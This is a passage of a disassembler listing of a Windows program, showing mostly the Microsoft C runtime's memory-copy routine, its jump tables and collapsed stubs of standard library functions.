		mov	ebp, esp
		push	edi
		push	esi
		mov	esi, [ebp+0Ch]
		mov	ecx, [ebp+10h]
		mov	edi, [ebp+8]
		mov	eax, ecx
		mov	edx, ecx
		add	eax, esi
		cmp	edi, esi
		jbe	short loc_403250
		cmp	edi, eax
		jb	loc_4033C8

loc_403250:				; CODE XREF: A:00403246j
		test	edi, 3
		jnz	short loc_40326C
		shr	ecx, 2
		and	edx, 3
		cmp	ecx, 8
		jb	short near ptr dword_40328C
		rep movsd
		jmp	ds:off_403378[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40326C:				; CODE XREF: A:00403256j
		mov	eax, edi
		mov	edx, 3
		sub	ecx, 4
		jb	short loc_403284
		and	eax, 3
		add	ecx, eax
		jmp	ds:dword_403290[eax*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403284:				; CODE XREF: A:00403276j
		jmp	ds:TrailUp0[ecx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
dword_40328C	dd 0C8D24FFh		; CODE XREF: A:00403261j
dword_403290	dd 90004033h		; DATA XREF: A:0040327Dr
		dd offset LeadUp1
		dd offset LeadUp2
		dd offset LeadUp3
LeadUp1		dd 68AD123h, 468A0788h,	1478801h, 0C102468Ah, 478802E9h
					; DATA XREF: A:00403294o
		dd 3C68302h, 8303C783h,	0CC7208F9h, 24FFA5F3h, 40337895h
		dd 498D00h
LeadUp2		dd 68AD123h, 468A0788h,	2E9C101h, 83014788h, 0C78302C6h
					; DATA XREF: A:00403298o
		dd 8F98302h, 0A5F3A672h, 789524FFh, 90004033h
LeadUp3		dd 68AD123h, 0C1460788h, 834702E9h, 8C7208F9h, 24FFA5F3h
					; DATA XREF: A:0040329Co
		dd 40337895h, 498D00h, 40336Fh,	40335Ch, 403354h, 40334Ch
		dd 403344h, 40333Ch, 403334h, 40332Ch
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

UnwindUp7:
		mov	eax, [esi+ecx*4-1Ch]
		mov	[edi+ecx*4-1Ch], eax

UnwindUp6:
		mov	eax, [esi+ecx*4-18h]
		mov	[edi+ecx*4-18h], eax

UnwindUp5:
		mov	eax, [esi+ecx*4-14h]
		mov	[edi+ecx*4-14h], eax

UnwindUp4:
		mov	eax, [esi+ecx*4-10h]
		mov	[edi+ecx*4-10h], eax

UnwindUp3:
		mov	eax, [esi+ecx*4-0Ch]
		mov	[edi+ecx*4-0Ch], eax

UnwindUp2:
		mov	eax, [esi+ecx*4-8]
		mov	[edi+ecx*4-8], eax

UnwindUp1:
		mov	eax, [esi+ecx*4-4]
		mov	[edi+ecx*4-4], eax
		lea	eax, ds:0[ecx*4]
		add	esi, eax
		add	edi, eax

UnwindUp0:
		jmp	ds:off_403378[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
off_403378	dd offset TrailUp0	; DATA XREF: A:00403265r A:UnwindUp0r
		dd offset TrailUp1
		dd offset TrailUp2
		dd offset TrailUp3
TrailUp0	dd 5E08458Bh		; CODE XREF: A:00403265j
					; DATA XREF: A:loc_403284r ...
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		pop	edi
		leave
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h
; [0000000B BYTES: COLLAPSED FUNCTION TrailUp1.	PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000011 BYTES: COLLAPSED FUNCTION TrailUp2.	PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000017 BYTES: COLLAPSED FUNCTION TrailUp3.	PRESS KEYPAD "+" TO EXPAND]
		align 4

loc_4033C8:				; CODE XREF: A:0040324Aj
		lea	esi, [ecx+esi-4]
		lea	edi, [ecx+edi-4]
		test	edi, 3
		jnz	short loc_4033FC
		shr	ecx, 2
		and	edx, 3
		cmp	ecx, 8
		jb	short loc_4033F0
		std
		rep movsd
		cld
		jmp	ds:off_403510[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h

loc_4033F0:				; CODE XREF: A:004033E1j A:00403438j ...
		neg	ecx
		jmp	ds:off_4034C0[ecx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4

loc_4033FC:				; CODE XREF: A:004033D6j
		mov	eax, edi
		mov	edx, 3
		cmp	ecx, 4
		jb	short near ptr dword_403414
		and	eax, 3
		sub	ecx, eax
		jmp	ds:dword_403418[eax*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dword_403414	dd 108D24FFh		; CODE XREF: A:00403406j
dword_403418	dd 90004035h		; DATA XREF: A:0040340Dr
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		sub	[eax+eax*2], dh
		add	[eax+34h], cl
		inc	eax
		add	[eax+34h], dh
		inc	eax
		add	[edx-2EDCFCBAh], cl
		mov	[edi+3], al
		dec	esi
		shr	ecx, 2
		dec	edi
		cmp	ecx, 8
		jb	short loc_4033F0
		std
		rep movsd
		cld
		jmp	ds:off_403510[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4

LeadDown2:
		mov	al, [esi+3]
		and	edx, ecx
		mov	[edi+3], al
		mov	al, [esi+2]
		shr	ecx, 2
		mov	[edi+2], al
		sub	esi, 2
		sub	edi, 2
		cmp	ecx, 8
		jb	short loc_4033F0
		std
		rep movsd
		cld
		jmp	ds:off_403510[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h

LeadDown3:
		mov	al, [esi+3]
		and	edx, ecx
		mov	[edi+3], al
		mov	al, [esi+2]
		mov	[edi+2], al
		mov	al, [esi+1]
		shr	ecx, 2
		mov	[edi+1], al
		sub	esi, 3
		sub	edi, 3
		cmp	ecx, 8
		jb	loc_4033F0
		std
		rep movsd
		cld
		jmp	ds:off_403510[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
		dd offset UnwindDown7
		dd offset UnwindDown6
		dd offset UnwindDown5
		dd offset UnwindDown4
		dd offset UnwindDown3
		dd offset UnwindDown2
		dd offset UnwindDown1
off_4034C0	dd offset UnwindDown0	; DATA XREF: A:004033F2r
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

UnwindDown7:				; DATA XREF: A:004034A4o
		mov	eax, [esi+ecx*4+1Ch]
		mov	[edi+ecx*4+1Ch], eax

UnwindDown6:				; DATA XREF: A:004034A8o
		mov	eax, [esi+ecx*4+18h]
		mov	[edi+ecx*4+18h], eax

UnwindDown5:				; DATA XREF: A:004034ACo
		mov	eax, [esi+ecx*4+14h]
		mov	[edi+ecx*4+14h], eax

UnwindDown4:				; DATA XREF: A:004034B0o
		mov	eax, [esi+ecx*4+10h]
		mov	[edi+ecx*4+10h], eax

UnwindDown3:				; DATA XREF: A:004034B4o
		mov	eax, [esi+ecx*4+0Ch]
		mov	[edi+ecx*4+0Ch], eax

UnwindDown2:				; DATA XREF: A:004034B8o
		mov	eax, [esi+ecx*4+8]
		mov	[edi+ecx*4+8], eax

UnwindDown1:				; DATA XREF: A:004034BCo
		mov	eax, [esi+ecx*4+4]
		mov	[edi+ecx*4+4], eax
		lea	eax, ds:0[ecx*4]
		add	esi, eax
		add	edi, eax
; [0000005E BYTES: COLLAPSED FUNCTION UnwindDown0. PRESS KEYPAD	"+" TO EXPAND]
		align 10h
; [00000007 BYTES: COLLAPSED FUNCTION _strcpy. PRESS KEYPAD "+"	TO EXPAND]
		align 10h
; [000000E0 BYTES: COLLAPSED FUNCTION _strcat. PRESS KEYPAD "+"	TO EXPAND]
; [0000007B BYTES: COLLAPSED FUNCTION _strlen. PRESS KEYPAD "+"	TO EXPAND]
; [0000002A BYTES: COLLAPSED FUNCTION _remove. PRESS KEYPAD "+"	TO EXPAND]
; [0000000B BYTES: COLLAPSED FUNCTION operator delete(void *). PRESS KEYPAD "+"	TO EXPAND]
; [0000002F BYTES: COLLAPSED FUNCTION __alloca_probe. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000080 BYTES: COLLAPSED FUNCTION _strstr. PRESS KEYPAD "+"	TO EXPAND]
; [00000028 BYTES: COLLAPSED FUNCTION _isdigit.	PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [000000FE BYTES: COLLAPSED FUNCTION _strncpy.	PRESS KEYPAD "+" TO EXPAND]
		align 10h
; START	OF FUNCTION CHUNK FOR _strchr

loc_4038F0:				; CODE XREF: _strchr+1Dj
		lea	eax, [edx-1]
		pop	ebx
		retn
; END OF FUNCTION CHUNK	FOR _strchr
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h
; [000000BC BYTES: COLLAPSED FUNCTION _strchr. PRESS KEYPAD "+"	TO EXPAND]
		align 10h
; [00000084 BYTES: COLLAPSED FUNCTION _strcmp. PRESS KEYPAD "+"	TO EXPAND]
; [000000EB BYTES: COLLAPSED FUNCTION start. PRESS KEYPAD "+" TO EXPAND]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		mov	esp, [ebp-18h]
		push	dword ptr [ebp-68h]
		call	__exit
; [00000025 BYTES: COLLAPSED FUNCTION __amsg_exit. PRESS KEYPAD	"+" TO EXPAND]
; [00000024 BYTES: COLLAPSED FUNCTION _fast_error_exit.	PRESS KEYPAD "+" TO EXPAND]
; [00000012 BYTES: COLLAPSED FUNCTION _malloc. PRESS KEYPAD "+"	TO EXPAND]
; [0000002C BYTES: COLLAPSED FUNCTION __nh_malloc. PRESS KEYPAD	"+" TO EXPAND]
; [00000036 BYTES: COLLAPSED FUNCTION __heap_alloc. PRESS KEYPAD "+" TO	EXPAND]
; [00000067 BYTES: COLLAPSED FUNCTION __dosmaperr. PRESS KEYPAD	"+" TO EXPAND]
; [0000002F BYTES: COLLAPSED FUNCTION _free. PRESS KEYPAD "+" TO EXPAND]
; [00000075 BYTES: COLLAPSED FUNCTION __isctype. PRESS KEYPAD "+" TO EXPAND]
; [0000002D BYTES: COLLAPSED FUNCTION __cinit. PRESS KEYPAD "+"	TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION _exit. PRESS KEYPAD "+" TO EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION __exit. PRESS KEYPAD "+" TO EXPAND]
; [00000099 BYTES: COLLAPSED FUNCTION _doexit. PRESS KEYPAD "+"	TO EXPAND]
; [0000001A BYTES: COLLAPSED FUNCTION __initterm. PRESS	KEYPAD "+" TO EXPAND]
; [00000141 BYTES: COLLAPSED FUNCTION __XcptFilter. PRESS KEYPAD "+" TO	EXPAND]
; [00000043 BYTES: COLLAPSED FUNCTION _xcptlookup. PRESS KEYPAD	"+" TO EXPAND]
; [00000058 BYTES: COLLAPSED FUNCTION __wincmdln. PRESS	KEYPAD "+" TO EXPAND]
; [000000B9 BYTES: COLLAPSED FUNCTION __setenvp. PRESS KEYPAD "+" TO EXPAND]
; [00000099 BYTES: COLLAPSED FUNCTION __setargv. PRESS KEYPAD "+" TO EXPAND]
; [000001B4 BYTES: COLLAPSED FUNCTION _parse_cmdline. PRESS KEYPAD "+" TO EXPAND]
; [00000132 BYTES: COLLAPSED FUNCTION ___crtGetEnvironmentStringsA. PRESS KEYPAD "+" TO	EXPAND]
; [000001AB BYTES: COLLAPSED FUNCTION __ioinit.	PRESS KEYPAD "+" TO EXPAND]
; [0000003C BYTES: COLLAPSED FUNCTION __heap_init. PRESS KEYPAD	"+" TO EXPAND]
		align 10h
; [00000020 BYTES: COLLAPSED FUNCTION __global_unwind2.	PRESS KEYPAD "+" TO EXPAND]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

__unwind_handler:			; DATA XREF: __local_unwind2+Ao
					; __abnormal_termination+9o
		mov	ecx, [esp+4]
		test	dword ptr [ecx+4], 6
		mov	eax, 1
		jz	short locret_404641
		mov	eax, [esp+8]
		mov	edx, [esp+10h]
		mov	[edx], eax
		mov	eax, 3

locret_404641:				; CODE XREF: A:00404630j
		retn
; [00000068 BYTES: COLLAPSED FUNCTION __local_unwind2. PRESS KEYPAD "+"	TO EXPAND]
; [00000023 BYTES: COLLAPSED FUNCTION __abnormal_termination. PRESS KEYPAD "+" TO EXPAND]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

__NLG_Notify1:
		push	ebx
		push	ecx
		mov	ebx, offset dword_40B16C
		jmp	short loc_4046E0
; [00000018 BYTES: COLLAPSED FUNCTION __NLG_Notify. PRESS KEYPAD "+" TO	EXPAND]
		align 10h
		push	esi
		inc	ebx
		xor	dh, [eax]
		pop	eax
		inc	ebx
		xor	[eax], dh
; [000000BD BYTES: COLLAPSED FUNCTION unknown_libname_1. PRESS KEYPAD "+" TO EXPAND]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

unknown_libname_8:			; Microsoft VisualC 2-7/net runtime
		push	ebp
		mov	ecx, [esp+8]
		mov	ebp, [ecx]
		mov	eax, [ecx+1Ch]
		push	eax
		mov	eax, [ecx+18h]
		push	eax
		call	__local_unwind2
		add	esp, 8
		pop	ebp
		retn	4
; [00000039 BYTES: COLLAPSED FUNCTION __FF_MSGBANNER. PRESS KEYPAD "+" TO EXPAND]
; [00000153 BYTES: COLLAPSED FUNCTION __NMSG_WRITE. PRESS KEYPAD "+" TO	EXPAND]
; [0000001B BYTES: COLLAPSED FUNCTION __callnewh. PRESS	KEYPAD "+" TO EXPAND]
; [0000003E BYTES: COLLAPSED FUNCTION ___sbh_heap_init.	PRESS KEYPAD "+" TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION ___sbh_find_block. PRESS KEYPAD "+" TO EXPAND]
; [0000032B BYTES: COLLAPSED FUNCTION ___sbh_free_block. PRESS KEYPAD "+" TO EXPAND]
; [00000309 BYTES: COLLAPSED FUNCTION ___sbh_alloc_block. PRESS	KEYPAD "+" TO EXPAND]
; [000000B1 BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_region. PRESS KEYPAD "+"	TO EXPAND]
; [000000FB BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_group. PRESS KEYPAD "+" TO EXPAND]
; [00000149 BYTES: COLLAPSED FUNCTION ___crtGetStringTypeA. PRESS KEYPAD "+" TO	EXPAND]
; [00000011 BYTES: COLLAPSED FUNCTION __ismbblead. PRESS KEYPAD	"+" TO EXPAND]
; [00000031 BYTES: COLLAPSED FUNCTION _x_ismbbtype. PRESS KEYPAD "+" TO	EXPAND]
; [00000199 BYTES: COLLAPSED FUNCTION __setmbcp. PRESS KEYPAD "+" TO EXPAND]
; [0000004A BYTES: COLLAPSED FUNCTION _getSystemCP. PRESS KEYPAD "+" TO	EXPAND]
; [00000033 BYTES: COLLAPSED FUNCTION _CPtoLCID. PRESS KEYPAD "+" TO EXPAND]
; [00000029 BYTES: COLLAPSED FUNCTION _setSBCS.	PRESS KEYPAD "+" TO EXPAND]
; [00000185 BYTES: COLLAPSED FUNCTION _setSBUpLow. PRESS KEYPAD	"+" TO EXPAND]
; [0000001C BYTES: COLLAPSED FUNCTION ___initmbctable. PRESS KEYPAD "+"	TO EXPAND]
; [00000089 BYTES: COLLAPSED FUNCTION ___crtMessageBoxA. PRESS KEYPAD "+" TO EXPAND]
		align 10h

_memcpy_0:				; CODE XREF: ___sbh_free_block+2EEp
		push	ebp
		mov	ebp, esp
		push	edi
		push	esi
		mov	esi, [ebp+0Ch]
		mov	ecx, [ebp+10h]
		mov	edi, [ebp+8]
		mov	eax, ecx
		mov	edx, ecx
		add	eax, esi
		cmp	edi, esi
		jbe	short loc_4057E0
		cmp	edi, eax
		jb	loc_405958

loc_4057E0:				; CODE XREF: A:004057D6j
		test	edi, 3
		jnz	short loc_4057FC
		shr	ecx, 2
		and	edx, 3
		cmp	ecx, 8
		jb	short near ptr dword_40581C
		rep movsd
		jmp	ds:off_405908[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4057FC:				; CODE XREF: A:004057E6j
		mov	eax, edi
		mov	edx, 3
		sub	ecx, 4
		jb	short loc_405814
		and	eax, 3
		add	ecx, eax
		jmp	ds:dword_405820[eax*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_405814:				; CODE XREF: A:00405806j
		jmp	ds:TrailUp0_0[ecx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
dword_40581C	dd 9C8D24FFh		; CODE XREF: A:004057F1j
dword_405820	dd 90004058h		; DATA XREF: A:0040580Dr
		dd offset dword_405830
		dd offset LeadUp2_0
		dd offset LeadUp3_0
dword_405830	dd 68AD123h, 468A0788h,	1478801h, 0C102468Ah, 478802E9h
					; DATA XREF: A:00405824o
		dd 3C68302h, 8303C783h,	0CC7208F9h, 24FFA5F3h, 40590895h
		dd 498D00h
LeadUp2_0	dd 68AD123h, 468A0788h,	2E9C101h, 83014788h, 0C78302C6h
					; DATA XREF: A:00405828o
		dd 8F98302h, 0A5F3A672h, 89524FFh, 90004059h
LeadUp3_0	dd 68AD123h, 0C1460788h, 834702E9h, 8C7208F9h, 24FFA5F3h
					; DATA XREF: A:0040582Co
		dd 40590895h, 498D00h, 4058FFh,	4058ECh, 4058E4h, 4058DCh
		dd 4058D4h, 4058CCh, 4058C4h, 4058BCh
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

UnwindUp7_0:
		mov	eax, [esi+ecx*4-1Ch]
		mov	[edi+ecx*4-1Ch], eax

UnwindUp6_0:
		mov	eax, [esi+ecx*4-18h]
		mov	[edi+ecx*4-18h], eax

UnwindUp5_0:
		mov	eax, [esi+ecx*4-14h]
		mov	[edi+ecx*4-14h], eax

UnwindUp4_0:
		mov	eax, [esi+ecx*4-10h]
		mov	[edi+ecx*4-10h], eax

UnwindUp3_0:
		mov	eax, [esi+ecx*4-0Ch]
		mov	[edi+ecx*4-0Ch], eax

UnwindUp2_0:
		mov	eax, [esi+ecx*4-8]
		mov	[edi+ecx*4-8], eax

UnwindUp1_0:
		mov	eax, [esi+ecx*4-4]
		mov	[edi+ecx*4-4], eax
		lea	eax, ds:0[ecx*4]
		add	esi, eax
		add	edi, eax

UnwindUp0_0:
		jmp	ds:off_405908[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
off_405908	dd offset TrailUp0_0	; DATA XREF: A:004057F5r
					; A:UnwindUp0_0r
		dd offset TrailUp1_0
		dd offset TrailUp2_0
		dd offset TrailUp3_0
TrailUp0_0	dd 5E08458Bh		; CODE XREF: A:004057F5j
					; DATA XREF: A:loc_405814r ...
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		pop	edi
		leave
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h
; [0000000B BYTES: COLLAPSED FUNCTION TrailUp1_0. PRESS	KEYPAD "+" TO EXPAND]
		align 4
; [00000011 BYTES: COLLAPSED FUNCTION TrailUp2_0. PRESS	KEYPAD "+" TO EXPAND]
		align 10h
; [00000017 BYTES: COLLAPSED FUNCTION TrailUp3_0. PRESS	KEYPAD "+" TO EXPAND]
		align 4

loc_405958:				; CODE XREF: A:004057DAj
		lea	esi, [ecx+esi-4]
		lea	edi, [ecx+edi-4]
		test	edi, 3
		jnz	short loc_40598C
		shr	ecx, 2
		and	edx, 3
		cmp	ecx, 8
		jb	short loc_405980
		std
		rep movsd
		cld
		jmp	ds:off_405AA0[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h

loc_405980:				; CODE XREF: A:00405971j A:004059C8j ...
		neg	ecx
		jmp	ds:off_405A50[ecx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4

loc_40598C:				; CODE XREF: A:00405966j
		mov	eax, edi
		mov	edx, 3
		cmp	ecx, 4
		jb	short near ptr dword_4059A4
		and	eax, 3
		sub	ecx, eax
		jmp	ds:dword_4059A8[eax*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dword_4059A4	dd 0A08D24FFh		; CODE XREF: A:00405996j
dword_4059A8	dd 9000405Ah		; DATA XREF: A:0040599Dr
		dd offset loc_4059B7+1
		dd offset LeadDown2_0
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		add	[edx+40h], bl

loc_4059B7:				; DATA XREF: A:004059ACo
		add	[edx-2EDCFCBAh], cl
		mov	[edi+3], al
		dec	esi
		shr	ecx, 2
		dec	edi
		cmp	ecx, 8
		jb	short loc_405980
		std
		rep movsd
		cld
		jmp	ds:off_405AA0[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4

LeadDown2_0:				; DATA XREF: A:004059B0o
		mov	al, [esi+3]
		and	edx, ecx
		mov	[edi+3], al
		mov	al, [esi+2]
		shr	ecx, 2
		mov	[edi+2], al
		sub	esi, 2
		sub	edi, 2
		cmp	ecx, 8
		jb	short loc_405980
		std
		rep movsd
		cld
		jmp	ds:off_405AA0[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h

LeadDown3_0:
		mov	al, [esi+3]
		and	edx, ecx
		mov	[edi+3], al
		mov	al, [esi+2]
		mov	[edi+2], al
		mov	al, [esi+1]
		shr	ecx, 2
		mov	[edi+1], al
		sub	esi, 3
		sub	edi, 3
		cmp	ecx, 8
		jb	loc_405980
		std
		rep movsd
		cld
		jmp	ds:off_405AA0[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
		dd offset UnwindDown7_0
		dd offset UnwindDown6_0
		dd offset UnwindDown5_0
